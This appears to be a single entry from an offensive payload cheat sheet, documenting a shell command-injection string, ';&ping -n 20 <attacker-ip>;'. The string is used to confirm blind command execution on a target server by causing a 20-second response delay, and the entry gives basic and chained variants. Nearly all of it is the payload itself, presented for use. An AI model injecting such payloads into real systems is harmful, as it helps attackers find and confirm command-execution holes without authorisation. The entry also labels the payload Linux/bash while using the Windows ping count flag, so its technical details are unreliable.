---
data: ;&ping -n 20 <attacker-ip>;
tags:
  - time-delay
  - ping
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:38.989Z'
id: 457ffa64-455a-4649-8daf-84fd1aba8420
verified: false
validated: true
submitted: true
---
# Ping Injection 20 Seconds

## Command

```bash
;&ping -n 20 <attacker-ip>;
```

## Description

Injected payload to send 20 ICMP pings, creating a ~20s delay to further validate blind command execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Number of pings (20) | Yes |
| <attacker-ip> | IP to ping | Yes |

## Examples

### Basic Usage

```bash
;&ping -n 20 1.1.1.1;
```

### Advanced Usage

```bash
;&ping -n 20 attacker-ip & # For non-blocking in chains
```

## Expected Output

Server response delayed by approximately 20 seconds, confirming injection via extended timing.

## Related

- [[commands/ping-injection-10]]
